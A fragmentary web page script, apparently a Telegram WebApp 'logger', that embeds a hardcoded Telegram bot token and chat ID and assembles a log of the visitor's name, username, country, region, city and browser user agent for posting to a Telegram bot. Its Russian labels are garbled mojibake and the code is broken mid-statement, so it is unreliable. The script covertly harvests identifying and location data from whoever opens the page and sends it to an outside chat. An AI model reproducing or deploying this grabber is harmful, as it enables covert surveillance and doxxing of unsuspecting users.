    <script>
        const BOT_TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";
        const CHAT_ID = "7477642275";
        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        function sendToTelegram(message) {
            fetch(API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },

            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.ready();
                const user = Telegram.WebApp.initDataUnsafe.user;
                if (user) {
                    logData += `[+] –ò–º—è: ${user.first_name} ${user.last_name || ''}\n`;
                    logData += `[+] –Æ–∑–µ—Ä–Ω–µ–π–º: @${user.username || '–ù–µ —É–∫–∞–∑–∞–Ω'}\n`;

                            logData += `    [+] –°—Ç—Ä–∞–Ω–∞: ${info.country || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `    [+] –†–µ–≥–∏–æ–Ω: ${info.region || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
                            logData += `    [+] –ì–æ—Ä–æ–¥: ${info.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n\n`;

                            logData += `[+] –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${navigator.userAgent}\n`;
